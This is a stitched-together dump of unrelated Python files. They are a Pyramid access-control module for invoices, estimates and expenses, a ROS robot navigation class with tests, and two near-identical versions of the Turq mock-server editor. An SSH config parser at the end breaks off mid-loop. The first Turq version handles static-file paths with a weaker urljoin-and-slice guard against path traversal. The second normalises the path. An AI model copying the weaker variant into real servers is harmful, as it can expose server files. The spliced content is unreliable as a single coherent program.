            ('templatinghistory', 'templatinghistory', TemplatingHistory, ),
            ('timeslots', 'timeslot', Timeslot, ),
            ('tvas', 'tva', Tva,),
            ('users', 'user', User, ),
            ('userdatas', 'userdatas', UserDatas, ),
            ('workshops', 'workshop', Workshop, ),
        ):

            self[traversal_name] = TraversalDbAccess(
                self,
                traversal_name,
                object_name,
                factory,
            )

        self['configfiles'] = TraversalDbAccess(
            self, 'configfiles', 'config_file', ConfigFiles, 'key'
        )


class TraversalDbAccess(object):
    """
        Class handling access to dbrelated objects
    """
    __acl__ = DEFAULT_PERM[:]
    dbsession = None

    def __init__(self, parent, traversal_name, object_name, factory,
                 id_key='id'):
        self.__parent__ = parent
        self.factory = factory
        self.object_name = object_name
        self.__name__ = traversal_name
        self.id_key = id_key

    def __getitem__(self, key):
        return self._get_item(self.factory, key, self.object_name)

    def _get_item(self, klass, key, object_name):
        assert self.dbsession is not None, "Missing dbsession"

        dbsession = self.dbsession()
        obj = dbsession.query(klass)\
                       .options(undefer_group('edit'))\
                       .filter(getattr(klass, self.id_key) == key)\
                       .scalar()

        if obj is None:
            raise KeyError

        obj.__name__ = object_name
        return obj


def get_base_acl(self):
    """
        return the base acl
    """
    acl = DEFAULT_PERM[:]
    acl.append(
        (
            Allow,
            Authenticated,
            'view',
        )
    )
    return acl


def get_userdatas_acl(self):
    """
    Return the acl for userdatas
    only the related account has view rights
    """
    acl = DEFAULT_PERM[:]
    if self.user is not None:
        acl.append(
            (
                Allow,
                self.user.login,
                (
                    'view',
                    'view.file',
                )
            ),
        )
    return acl


def get_event_acl(self):
    """
    Return acl fr events participants can view
    """
    acl = DEFAULT_PERM[:]
    for user in self.participants:
        acl.append(
            (
                Allow,
                user.login,
                ("view_activity", "view_workshop", "view.file")
            )
        )
    return acl


def get_activity_acl(self):
    """
    Return acl for activities : companies can also view
    """
    acl = get_event_acl(self)
    for companies in self.companies:
        for user in companies.employees:
            acl.append(
                (
                    Allow,
                    user.login,
                    ("view_activity", "view.file")
                )
            )
    return acl


def get_company_acl(self):
    """
        Compute the company's acl
    """
    acl = DEFAULT_PERM[:]
    acl.extend(
        [(
            Allow,
            user.login,
            (
                "view_company",
                "edit_company",
                # for logo and header
                "view.file",
                "list_customers",
                "add_customer",
                "list_projects",
                "add_project",
                'list_estimations',
                "list_invoices",
                "edit_commercial_handling",
                "list_expenses",
                "add.expense",
                "list_sale_products",
                "add_sale_product",
                "list_treasury_files",
                # Accompagnement
                "list_activities",
                "list_workshops",
            )
        )for user in self.employees]
    )
    return acl


def get_user_acl(self):
    """
        Get acl for user account edition
    """
    acl = DEFAULT_PERM[:]
    if self.enabled():
        acl.append(
            (
                Allow,
                self.login,
                (
                    "view_user",
                    "edit_user",
                    'list_holidays',
                    'add_holiday',
                    'edit_holiday',
                    'list_competences',
                )
            )
        )
        acl.append((Allow, Authenticated, ('visit')))
    return acl


def _get_user_status_acl(self):
    """
    Return the common status related acls
    """
    acl = []

    for user in self.company.employees:
        perms = (
            'view.%s' % self.type_,
            'view.file',
            'add.file',
            'edit.file',
        )

        if self.status in ('draft', 'invalid'):
            perms += (
                'edit.%s' % self.type_,
                'wait.%s' % self.type_,
                'delete.%s' % self.type_,
                'draft.%s' % self.type_,
            )
        if self.status in ('wait',):
            perms += ('draft.%s' % self.type_,)

        acl.append((Allow, user.login, perms))
    return acl


def _get_admin_status_acl(self):
    """
    Return the common status related acls
    """
    perms = (
        'view.%s' % self.type_,
        'admin.%s' % self.type_,
        'view.file',
        'add.file',
        'edit.file',
    )

    if self.status in ('draft', 'wait', 'invalid'):
        perms += (
            'edit.%s' % self.type_,
            'valid.%s' % self.type_,
            'delete.%s' % self.type_,
            'draft.%s' % self.type_,
        )
        if self.status == 'wait':
            perms += ('invalid.%s' % self.type_,)

    return [
        (Allow, 'group:admin', perms),
        (Allow, 'group:manager', perms),
    ]


def get_estimation_default_acl(self):
    """
    Return acl for the estimation handling

    :returns: A pyramid acl list
    :rtype: list
    """
    acl = DEFAULT_PERM_NEW[:]

    acl.extend(_get_admin_status_acl(self))
    admin_perms = ()

    if self.status == 'valid' and self.signed_status != 'aborted':
        admin_perms += ('geninv.estimation',)

    if self.status == 'valid':
        admin_perms += ('set_signed_status.estimation',)

    if self.status == 'valid' and self.signed_status != 'signed' and not \
            self.geninv:
        admin_perms += ('set_date.estimation',)

    if admin_perms:
        acl.append((Allow, "group:admin", admin_perms))
        acl.append((Allow, "group:manager", admin_perms))

    # Common estimation access acl
    if self.status != 'valid':
        acl.append(
            (Allow, "group:estimation_validation", ('valid.estimation',))
        )
        acl.append((Deny, "group:estimation_validation", ('wait.estimation',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()

        if self.status == 'valid':
            perms += ('set_signed_status.estimation', )
            if not self.signed_status == 'aborted':
                perms += ('geninv.estimation',)

        if perms:
            acl.append((Allow, user.login, perms))
    return acl


def get_invoice_default_acl(self):
    """
    Return the acl for invoices

    :returns: A pyramid acl list
    :rtype: list
    """
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('gencinv.invoice', 'add_payment.invoice',)

    if self.status == 'valid' and self.paid_status == 'waiting' \
            and not self.exported:
        admin_perms += ('set_date.invoice',)

    if not self.exported:
        admin_perms += ('set_treasury.invoice',)

    if admin_perms:
        acl.append((Allow, "group:admin", admin_perms))
        acl.append((Allow, "group:manager", admin_perms))

    if self.status != 'valid':
        acl.append((Allow, "group:invoice_validation", ('valid.invoice',)))
        acl.append((Deny, "group:invoice_validation", ('wait.invoice',)))

    if self.status == 'valid' and self.paid_status != 'resulted':
        acl.append((Allow, "group:payment_admin", ('add_payment.invoice',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()
        if self.status == 'valid' and self.paid_status != 'resulted':
            perms += ('gencinv.invoice',)

        if perms:
            acl.append((Allow, user.login, perms))

    return acl


def get_cancelinvoice_default_acl(self):
    """
    Return the acl for cancelinvoices
    """
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported and self.status == 'valid':
        admin_perms += ('set_treasury.cancelinvoice', 'set_date.cancelinvoice')

    if admin_perms:
        acl.append((Allow, "group:admin", admin_perms))
        acl.append((Allow, "group:manager", admin_perms))

    if self.status != 'valid':
        acl.append(
            (Allow, "group:invoice_validation", ('valid.cancelinvoice',))
        )
        acl.append((Deny, "group:invoice_validation", ('wait.cancelinvoice',)))

    acl.extend(_get_user_status_acl(self))
    return acl


def get_task_line_group_acl(self):
    """
    Return the task line acl
    """
    return self.task.__acl__()                    


def get_task_line_acl(self):
    """
    Return the task line acl
    """
    return self.group.__acl__()                    


def get_discount_line_acl(self):
    """
    Return the acls for accessing the discount line
    """
    return self.task.__acl__()                    


def get_payment_line_acl(self):
    """
    Return the acls for accessing a payment line
    """
    return self.task.__acl__()                    


def get_expense_sheet_default_acl(self):
    """
    Compute the expense Sheet acl

    view
    edit
    add_payment

    wait
    valid
    invalid
    delete

    add.file
    edit.file
    view.file

    :returns: Pyramid acl
    :rtype: list
    """
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported:
        admin_perms += ('set_treasury.expensesheet',)

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('add_payment.expensesheet',)

    if admin_perms:
        acl.append((Allow, "group:admin", admin_perms))
        acl.append((Allow, "group:manager", admin_perms))

    acl.extend(_get_user_status_acl(self))

    return acl


def get_payment_default_acl(self):
    """
    Compute the acl for a Payment object

    view
    edit
    """
    acl = DEFAULT_PERM_NEW[:]

    admin_perms = ('view.payment',)
    if not self.exported:
        admin_perms += ('edit.payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))
    acl.append((Allow, 'group:payment_admin', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.payment',)))

    return acl


def get_expense_payment_acl(self):
    """
    Compute the acl for an Expense Payment object

    view
    edit
    """
    acl = DEFAULT_PERM_NEW[:]
    admin_perms = ('view.expensesheet_payment',)
    if not self.exported:
        admin_perms += ('edit.expensesheet_payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.expensesheet_payment',)))

    return acl


def get_customer_acl(self):
    """
    Compute the customer's acl
    """
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (Allow, user.login, ('view_customer', 'edit_customer',))
        )
    return acl


def get_phase_acl(self):
    """
    Return acl for a phase
    """
    return get_project_acl(self.project)


def get_project_acl(self):
    """
    Return acl for a project
    """
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'view_project',
                    'edit_project',
                    'add_project',
                    'edit_phase',
                    'add_phase',
                    'add_estimation',
                    'add_invoice',
                    'list_estimations',
                    'list_invoices',
                    'view.file',
                    'add.file',
                    'edit.file',
                )
            )
        )

    return acl


def get_file_acl(self):
    """
    Compute the acl for a file object
    a file object's acl are simply the parent's
    """
    if self.parent is not None:
        return self.parent.__acl__
    # Exceptions: headers and logos are not attached throught the Node's parent
    # rel
    elif self.company_header_backref is not None:
        return self.company_header_backref.__acl__
    elif self.company_logo_backref is not None:
        return self.company_logo_backref.__acl__
    else:
        return []


def get_product_acl(self):
    """
    Return the acl for a product : A product's acl is given by its category
    """
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'list_sale_products',
                    'view_sale_product',
                    'edit_sale_product',
                )
            )
        )
    return acl


def get_competence_acl(self):
    """
    Return acl for the Competence Grids objects
    """
    acl = DEFAULT_PERM[:]
    login = self.contractor.login
    acl.append(
        (
            Allow,
            u'%s' % login,
            (
                "view_competence",
                "edit_competence"
            )
        )
    )
    return acl


def set_models_acl():
    """
    Add acl to the db objects used as context

    Here acl are set globally, but we'd like to set things more dynamically
    when different roles will be implemented
    """
    Activity.__default_acl__ = property(get_activity_acl)
    CancelInvoice.__default_acl__ = property(get_cancelinvoice_default_acl)
    Company.__default_acl__ = property(get_company_acl)
    CompetenceGrid.__acl__ = property(get_competence_acl)
    CompetenceGridItem.__acl__ = property(get_competence_acl)
    CompetenceGridSubItem.__acl__ = property(get_competence_acl)
    ConfigFiles.__default_acl__ = [(Allow, Everyone, 'view'), ]
    Customer.__default_acl__ = property(get_customer_acl)
    DiscountLine.__acl__ = property(get_discount_line_acl)
    Estimation.__default_acl__ = property(get_estimation_default_acl)
    ExpenseSheet.__default_acl__ = property(get_expense_sheet_default_acl)
    ExpensePayment.__default_acl__ = property(get_expense_payment_acl)
    File.__default_acl__ = property(get_file_acl)
    Invoice.__default_acl__ = property(get_invoice_default_acl)
    Job.__default_acl__ = DEFAULT_PERM[:]
    Payment.__default_acl__ = property(get_payment_default_acl)
    PaymentLine.__acl__ = property(get_payment_line_acl)
    Phase.__acl__ = property(get_phase_acl)
    Project.__default_acl__ = property(get_project_acl)
    SaleProductCategory.__acl__ = property(get_product_acl)
    SaleProduct.__acl__ = property(get_product_acl)
    SaleProductGroup.__acl__ = property(get_product_acl)
    StatisticSheet.__acl__ = property(get_base_acl)
    StatisticEntry.__acl__ = property(get_base_acl)
    BaseStatisticCriterion.__acl__ = property(get_base_acl)
    TaskLine.__acl__ = property(get_task_line_acl)
    TaskLineGroup.__acl__ = property(get_task_line_group_acl)
    Template.__default_acl__ = property(get_base_acl)
    TemplatingHistory.__default_acl__ = property(get_base_acl)
    Timeslot.__default_acl__ = property(get_base_acl)
    User.__default_acl__ = property(get_user_acl)
    UserDatas.__default_acl__ = property(get_userdatas_acl)
    Workshop.__default_acl__ = property(get_event_acl)

    Tva.__acl__ = property(get_base_acl)
    ExpenseType.__acl__ = property(get_base_acl)
    ExpenseKmType.__acl__ = property(get_base_acl)
    ExpenseTelType.__acl__ = property(get_base_acl)

""" Navigation and localization
    
Author:
    Annaleah Ernst
"""
import tf
import rospy
import numpy as np

from copy import deepcopy
from geometry_msgs.msg import Pose, Point, Quaternion
from math import sin, cos, pi
from time import time

from localization import Localization
from logger import Logger
from navigation import Navigation

class NavLoc(Navigation, Localization):
    """ Navigate and localize on a map.
    
    Args:
        point_ids (set): Unique identifier for each waypoint in the graph.
        locations (dict): Point_ids mapped to tuples representing locations.
        neighbors (dict): Point_ids mapped to lists containing other point_ids representing 
            the current node's neighbors.
        landmark_ids (set): Unique identifier for each landmark in the graph.
        landmark_positions (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan.
        landmark_angles (dict): Map AprilTag landmark ids to their absolute
            position on the floorplan. This specifies the angle of rotation of the landmark in the 
            xy plane; ie, how much has its horizontal vector deviated from the x axis.
        jerky (bool, optional): If true, robot will not decelerate, but stop abruptly.
            Defaults to False.
        walking_speed (float, optional): Percentage of maximum speed, magnitude between 0 and 1.
                Values with magnitude greater than 1 will be ignored.
    
    Attributes:
        tags (geometry_msgs.msg.PoseStamped dict): A dict of all the AprilTags currently in view in 
            their raw form.
        tags_odom (geometry_msgs.msg.PoseStamped dict): Same as above, but in the odometry frame.
        floorplan (FloorPlan): The map of the current space as a floorplan.
        p (geometry_msgs.msg.Point): The position of the robot in the ekf odometry frame according to
            the robot_pose_ekf package.
        q (geometry_msgs.msg.Quaternion): The orientation of the robot in the ekf odometry frame
            according the the robot_pose_ekf package.
        angle (float): The angle (in radians) that the robot is from 0 in the ekf odometry frame. 
            Between -pi and pi
        map_pos (geometry_msgs.msg.Point): The position of the robot in the map frame.
        map_angle (float): The angle (in radians) of the robot in the map frame.
    """
    
    def __init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles, jerky = False, walking_speed = 1):
        
        # create map position
        self.map_pos = Point()
        self.map_angle = 0
        
        # create a path variable so that we can navigate via waypoints
        self._path = None
    
        # initialize what we're inheriting from
        Localization.__init__(self, point_ids, locations, neighbors, landmark_ids, landmark_positions, landmark_angles)
        Navigation.__init__(self, jerky = jerky, walking_speed = walking_speed)

        self._logger = Logger("NavLoc")
    
        # give ourselves a second to see if there's a nearby AR tag
        timer = time()
        while time() - timer < 0.5:
            pass
    
    def _ekfCallback(self, data):
        """ Process robot_pose_ekf data. """
        
        # get the ekf data
        Navigation._ekfCallback(self, data)
        
        # compute map data
        self.map_pos = self.transformPoint(self.p, "odom", "map")
        self.map_angle = self.transformAngle(self.angle, "odom", "map")
    
    def _handleObstacle(self, turn_delta):
        """ Handle obstacle and reset path if necessary. """
        
        if Navigation._handleObstacle(self, turn_delta):
            self._path = None
            return True
            
        return False
    
    def goToOrientation(self, angle):
        """ Go to orientation in the map frame. """
        return Navigation.goToOrientation(self, self.transformAngle(angle, "map", "odom"))
    
    def takePathToDest(self, x, y):
        """ Go the target pos via waypoints from the floorplan. 
        
        Args:
            x (float): The destination x coord in the map frame.
            y (float): The destination y coord in the map frame.
        """
        
        # we currently aren't on a mission, or we've been interrupted
        if self._path is None:
            self._path = self.floorplan.getShortestPath(self.map_pos, Point(x,y,0))
        
        # we've arrived a waypoint on our path to destination
        if self.goToPosition(self._path[0].x, self._path[0].y):
            self._logger.info("Arrived at waypoint " + str((self._path[0].x, self._path[0].y)) + " (map position is " +
                str((self.map_pos.x, self.map_pos.y)) + ")")
            self._path.pop(0)
            
        # we've cleared out the traversal path, so we've reached our goal
        if not self._path:                    
            self._path = None
            self._logger.debug("no path!")
            return True
        
        # we're still on our way to the destination
        return False
    
    def goToPosition(self, x, y):
        """ Go to position x, y, in the map frame"""
        transformed_point = self.transformPoint(Point(x, y, 0), "map", "odom")
        return Navigation.goToPosition(self, transformed_point.x, transformed_point.y)

    def csvLogArrival(self, test_name, x, y, folder = "tests"):
        """ Log the arrival of the robot at a waypoint. """
        
        self._logger.csv(test_name + "_waypoints", ["X_target", "Y_target", "X_map", "Y_map", "X_ekf", "Y_ekf"],
                    [x, y, self.map_pos.x, self.map_pos.y, self.p.x, self.p.y],
                    folder = folder)

    def csvLogMap(self, test_name, folder = "tests"):
        """ Log map position data. """
         
        self._logger.csv(test_name + "_mappose", ["X", "Y", "yaw"], [self.map_pos.x, self.map_pos.y, self.map_angle], folder = folder)

if __name__ == "__main__":
    import MD2
    from tester import Tester
    from math import pi
    
    class NavLocTest(Tester):
        """ Run local navigation tests. """
        def __init__(self):
            Tester.__init__(self, "NavLoc")
            
            # flag for a jerky stop
            self.jerky = False
            
            # I'm a bit concerned about robot safety if we don't slow things down,
            # but I'm also worried it won't be an accurate test if we change the speed
            self.walking_speed = 1 # if not self.jerky else .5
            
            # linear test
            self.reached_goal = False
            
            # square test
            self.reached_corner = [False, False, False, False]
            self.cc_square = [(0,0), (1,0), (1,1), (0,1)]
            self.c_square = [(0,0), (1,0), (1,-1), (0, -1)]
            self.corner_counter = 0
        
            # set up the logger output file
            self.test_name = "path"
        
            # set up points on map
            point_ids = MD2.points
            locations = MD2.locations
            neighbors = MD2.neighbors
        
            # set map location of the landmark
            landmarks = MD2.landmarks
            landmark_positions = MD2.landmark_pos
            landmark_orientations = MD2.landmark_orient
        
            self.navloc = NavLoc(point_ids, locations, neighbors,landmarks, landmark_positions, landmark_orientations, jerky = self.jerky, walking_speed = self.walking_speed)
        
            # set the destinations
            self.destination = [self.navloc.floorplan.graph['T'].location, self.navloc.floorplan.graph['R'].location]

        def main(self):
            """ The test currently being run. """
            #self.testCCsquare(1)
            #self.testCsquare(1)
            #self.testLine(1.5)
            self.testPath()
            self.navloc.csvLogEKF(self.test_name)
            self.navloc.csvLogMap(self.test_name)
            self.navloc.csvLogTransform(self.test_name)
            self.navloc.csvLogRawTags(self.test_name)
            self.navloc.csvLogOdomTags(self.test_name)
            #self.navloc.takePathToDest(1.5,0)

        def initFile(self, filename):
            """ Write the first line of our outgoing file (variable names). """
            self.test_name = filename + ("jerky" if self.jerky else "smooth")
        
        def logArrival(self, name, x, y):
            self.logger.info("Arrived at " + str((x, y)) + " (map position is " +
                str((self.navloc.map_pos.x, self.navloc.map_pos.y)) + ")")
            self.navloc.csvLogArrival(self.test_name, x, y)
            
        def testPath(self):
            """ Attempt to navigation between two offices"""
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.takePathToDest(self.destination[0].x, self.destination[0].y)
                if self.reached_corner[0]:
                    self.logArrival("office 1", self.destination[0].x, self.destination[0].y)
                    
            elif self.navloc.takePathToDest(self.destination[1].x, self.destination[1].y):
                self.reached_corner[0] = False
                self.logArrival("office 2", self.destination[1].x, self.destination[1].y)
        
        def testLine(self, length):
            """ Test behavior with a simple line. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """
            if self.test_name is None:
                self.initFile("line")
            
            if not self.reached_corner[0]:
                self.reached_corner[0] = self.navloc.goToPosition(0, 0)
                if self.reached_corner[0]:
                    self.logArrival("home", 0, 0)
        
            elif self.navloc.goToPosition(length, 0):
                self.reached_corner[0] = False
                self.logArrival("endpoint", length, 0)
    
        def testCCsquare(self, length):
            """ Test a counter clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """
            if self.test_name is None:
                self.initFile("counterclockwise")
            
            self.testSquare(length, self.cc_square)
        
        def testCsquare(self, length):
            """ Test a clockwise square. 
            
            Args:
                length (float): Length of the desired line (in meters).
            """
            if self.test_name is None:
                self.initFile("clockwise")
            
            self.testSquare(length, self.c_square)
    
        def testSquare(self, length, corners):
            """ Test behavior with a simple square. 
            
            Args:
                length (float): Length of the sides of the square (in meters).
            """
            # test a simple square
            if not self.reached_corner[self.corner_counter]:
                self.reached_corner[self.corner_counter] = self.navloc.goToPosition(corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
            
            else:
                self.logArrival("corner " + str(self.corner_counter), corners[self.corner_counter][0]*length, corners[self.corner_counter][1]*length)
                if self.corner_counter == len(self.reached_corner) - 1:
                    self.reached_corner = [False] * len(self.reached_corner)
                self.corner_counter = (self.corner_counter + 1) % len(self.reached_corner)
    
        def shutdown(self):
            """ Kill all behavioral test processes. """
            self.navloc.shutdown(self.rate)
            Tester.shutdown(self)
        
    NavLocTest().run()

# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import socket
import socketserver
import string
import threading
import urllib.parse                    
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to "Show saved copy" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm="%s", qop="auth", charset=UTF-8, '
                'nonce="%s", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = urllib.parse.urljoin('/', req.path)      # Avoid path traversal
    filename = path[len(STATIC_PREFIX):]                    
    try:
        resp.data = pkgutil.get_data('turq', 'editor/%s' % filename)                    
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(filename)                    


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']

# pylint: disable=unused-argument

import base64
import hashlib
import html
import mimetypes
import os
import pkgutil
import posixpath
import socket
import socketserver
import string
import threading
import wsgiref.simple_server

import falcon
import werkzeug.formparser

import turq.examples
from turq.util.http import guess_external_url


STATIC_PREFIX = '/static/'


def make_server(host, port, ipv6, password, mock_server):
    editor = falcon.API(media_type='text/plain; charset=utf-8',
                        # This server is very volatile: who knows what will be
                        # listening on this host and port tomorrow? So, disable
                        # caching completely. We don't want Chrome to prompt
                        # to "Show saved copy" when Turq is not running, etc.
                        middleware=[DisableCache()])
    # Microsoft Edge doesn't send ``Authorization: Digest`` to ``/``.
    # Can be circumvented with ``/?``, but I think ``/editor`` is better.
    editor.add_route('/editor', EditorResource(mock_server, password))
    editor.add_route('/', RedirectResource())
    editor.add_sink(static_file, STATIC_PREFIX)
    editor.set_error_serializer(text_error_serializer)
    return wsgiref.simple_server.make_server(
        host, port, editor,
        IPv6EditorServer if ipv6 else EditorServer,
        EditorHandler)


def text_error_serializer(req, resp, exc):
    resp.body = exc.title


class EditorServer(socketserver.ThreadingMixIn,
                   wsgiref.simple_server.WSGIServer):

    address_family = socket.AF_INET
    allow_reuse_address = True
    daemon_threads = True

    def handle_error(self, request, client_address):
        # Do not print tracebacks.
        pass


class IPv6EditorServer(EditorServer):

    address_family = socket.AF_INET6


class EditorHandler(wsgiref.simple_server.WSGIRequestHandler):

    def log_message(self, *args):       # Do not log requests and responses.
        pass


class EditorResource:

    realm = 'Turq editor'
    template = string.Template(
        pkgutil.get_data('turq', 'editor/editor.html.tpl').decode('utf-8'))

    def __init__(self, mock_server, password):
        self.mock_server = mock_server
        self.password = password
        self.nonce = self.new_nonce()
        self._lock = threading.Lock()

    def on_get(self, req, resp):
        self.check_auth(req)
        resp.content_type = 'text/html; charset=utf-8'
        (mock_host, mock_port, *_) = self.mock_server.server_address
        resp.body = self.template.substitute(
            mock_host=html.escape(mock_host), mock_port=mock_port,
            mock_url=html.escape(guess_external_url(mock_host, mock_port)),
            rules=html.escape(self.mock_server.rules),
            examples=turq.examples.load_html(initial_header_level=3))

    def on_post(self, req, resp):
        self.check_auth(req)
        # Need `werkzeug.formparser` because JavaScript sends ``FormData``,
        # which is encoded as multipart.
        (_, form, _) = werkzeug.formparser.parse_form_data(req.env)
        if 'rules' not in form:
            raise falcon.HTTPBadRequest('Bad form')
        try:
            self.mock_server.install_rules(form['rules'])
        except SyntaxError as exc:
            resp.status = falcon.HTTP_422   # Unprocessable Entity
            resp.body = str(exc)
        else:
            resp.status = falcon.HTTP_303   # See Other
            resp.location = '/editor'
            resp.body = 'Rules installed successfully.'

    # We use HTTP digest authentication here, which provides a fairly high
    # level of protection. We use only one-time nonces, so replay attacks
    # should not be possible. An active man-in-the-middle could still intercept
    # a request and substitute their own rules; the ``auth-int`` option
    # is supposed to protect against that, but Chrome and Firefox (at least)
    # don't seem to support it.

    def check_auth(self, req):
        if not self.password:
            return
        auth = werkzeug.http.parse_authorization_header(req.auth)
        password_ok = False
        if self.check_password(req, auth):
            password_ok = True
            with self._lock:
                if auth.nonce == self.nonce:
                    self.nonce = self.new_nonce()
                    return
        raise falcon.HTTPUnauthorized(headers={
            'WWW-Authenticate':
                'Digest realm="%s", qop="auth", charset=UTF-8, '
                'nonce="%s", stale=%s' %
                (self.realm, self.nonce, 'true' if password_ok else 'false')})

    def check_password(self, req, auth):
        if not auth:
            return False
        a1 = '%s:%s:%s' % (auth.username, self.realm, self.password)
        a2 = '%s:%s' % (req.method, auth.uri)
        response = self.h('%s:%s:%s:%s:%s:%s' % (self.h(a1),
                                                 auth.nonce, auth.nc,
                                                 auth.cnonce, auth.qop,
                                                 self.h(a2)))
        return auth.response == response

    @staticmethod
    def h(s):               # pylint: disable=invalid-name
        return hashlib.md5(s.encode('utf-8')).hexdigest().lower()

    @staticmethod
    def new_nonce():
        return base64.b64encode(os.urandom(18)).decode()


class RedirectResource:

    def on_get(self, req, resp):
        raise falcon.HTTPFound('/editor')

    on_post = on_get


def static_file(req, resp):
    path = '/' + req.path[len(STATIC_PREFIX):]
    path = posixpath.normpath(path)           # Avoid path traversal
    try:
        resp.data = pkgutil.get_data('turq', 'editor%s' % path)
    except FileNotFoundError:
        raise falcon.HTTPNotFound()
    else:
        (resp.content_type, _) = mimetypes.guess_type(path)


class DisableCache:

    def process_response(self, req, resp, resource, req_succeeded):
        resp.cache_control = ['no-store']

import logging
from pathlib import Path
import psutil
from subprocess import PIPE
import re


class PathNotFoundException(Exception):
    def __init__(self, nearest_path=''):
        self.nearest_path = nearest_path


class SshConfig:
    """
    Parse SSH config files to their basic host details
    """
    def __init__(self, file):
        self.file = file
        self.hosts = list()
        self.parse()

    def new_host(self):
        return dict({'host': '', 'hostname': '', 'port': 22, 'username': '', 'password': '', 'type': 'system'})

    def parse(self):
        logging.debug('Parsing SSH config file {}'.format(str(self.file)))
        if not self.file.is_file():
            logging.debug('SSH config does not exist')
            return

        with self.file.open('r') as ssh_config:
            host = self.new_host()
            for line in ssh_config.readlines():
